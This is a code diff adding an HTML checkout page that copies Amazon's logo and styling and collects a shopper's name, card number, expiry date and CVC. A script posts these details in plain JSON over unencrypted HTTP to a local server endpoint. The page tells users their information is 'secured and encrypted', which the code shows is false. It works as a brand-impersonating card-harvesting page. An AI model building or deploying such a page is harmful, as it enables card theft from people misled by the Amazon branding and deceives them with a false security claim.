@@ -1,0 +1,203 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Amazon-style Payment</title>
+    <link rel="stylesheet" href="style.css" />
+    <style>
+      /* Улучшенные стили для формы оплаты в стиле Amazon */
+      body {
+        font-family: 'Amazon Ember', Arial, sans-serif;
+        background-color: #f3f3f3;
+        margin: 0;
+        padding: 0;
+      }
+
+      .payment-container {
+        max-width: 400px;
+        margin: 50px auto;
+        padding: 20px;
+        background-color: white;
+        border-radius: 8px;
+        box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      }
+
+      .logo {
+        display: flex;
+        justify-content: center;
+        margin-bottom: 20px;
+      }
+
+      .logo img {
+        width: 120px;
+      }
+
+      h2,
+      h3 {
+        color: #333;
+        text-align: center;
+      }
+
+      .form-section {
+        margin-bottom: 20px;
+      }
+
+      label {
+        font-size: 13px;
+        color: #111;
+        margin-bottom: 5px;
+        display: block;
+        font-weight: bold;
+      }
+
+      input {
+        width: 100%;
+        padding: 10px;
+        margin-top: 5px;
+        margin-bottom: 10px;
+        border: 1px solid #d9d9d9;
+        border-radius: 4px;
+        font-size: 14px;
+        box-sizing: border-box;
+        background-color: #fff;
+        transition: border-color 0.3s ease;
+      }
+
+      input:focus {
+        border-color: #ffa41c;
+        outline: none;
+      }
+
+      .submit-button {
+        background-color: #ffa41c;
+        color: white;
+        padding: 12px;
+        font-size: 16px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+        width: 100%;
+      }
+
+      .submit-button:hover {
+        background-color: #ff9900;
+      }
+
+      .disclaimer {
+        text-align: center;
+        font-size: 12px;
+        color: #666;
+        margin-top: 10px;
+      }
+
+      @media (max-width: 600px) {
+        .payment-container {
+          margin: 20px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="payment-container">
+      <!-- Логотип Amazon -->
+      <div class="logo">
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg"
+          alt="Amazon Logo"
+        />
+      </div>
+
+      <h2>Checkout</h2>
+      <form id="payment-form">
+        <div class="form-section">
+          <h3>Shipping Information</h3>
+          <label for="firstName">First Name:</label>
+          <input
+            type="text"
+            id="firstName"
+            name="firstName"
+            placeholder="John"
+            required
+          />
+
+          <label for="lastName">Last Name:</label>
+          <input
+            type="text"
+            id="lastName"
+            name="lastName"
+            placeholder="Doe"
+            required
+          />
+        </div>
+
+        <div class="form-section">
+          <h3>Payment Information</h3>
+          <label for="cardNumber">Card Number:</label>
+          <input
+            type="text"
+            id="cardNumber"
+            name="cardNumber"
+            placeholder="•••• •••• •••• ••••"
+            required
+          />
+
+          <label for="cardExpiry">Expiry Date:</label>
+          <input
+            type="text"
+            id="cardExpiry"
+            name="cardExpiry"
+            placeholder="MM/YY"
+            required
+          />
+
+          <label for="cardCvc">CVC:</label>
+          <input
+            type="text"
+            id="cardCvc"
+            name="cardCvc"
+            placeholder="123"
+            required
+          />
+        </div>
+
+        <button type="submit" class="submit-button">Place Order</button>
+      </form>
+
+      <p class="disclaimer">Your information is secured and encrypted.</p>
+    </div>
+
+    <script>
+      document
+        .getElementById('payment-form')
+        .addEventListener('submit', async function (event) {
+          event.preventDefault();
+          const formData = {
+            firstName: document.getElementById('firstName').value,
+            lastName: document.getElementById('lastName').value,
+            cardNumber: document.getElementById('cardNumber').value,
+            cardExpiry: document.getElementById('cardExpiry').value,
+            cardCvc: document.getElementById('cardCvc').value,
+          };
+
+          try {
+            const response = await fetch(
+              'http://localhost:3002/submit-payment',
+              {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(formData),
+              },
+            );
+            const result = await response.text();
+            alert(result);
+          } catch (error) {
+            console.error('Error:', error);
+          }
+        });
+    </script>
+  </body>
+</html>
